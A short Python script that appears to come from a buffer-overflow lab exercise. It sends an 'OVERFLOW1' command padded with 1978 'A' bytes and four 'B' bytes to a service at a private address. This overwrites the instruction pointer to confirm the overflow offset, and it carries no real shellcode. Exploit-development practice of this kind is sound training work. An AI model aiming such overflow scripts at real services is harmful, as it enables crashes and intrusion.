#!/usr/bin/python3

import sys, socket

shellcode = "A" * 1978 + "B" * 4

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.10.171.225',1337))

	payload = "OVERFLOW1 " + shellcode
	
	s.send((payload.encode()))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()
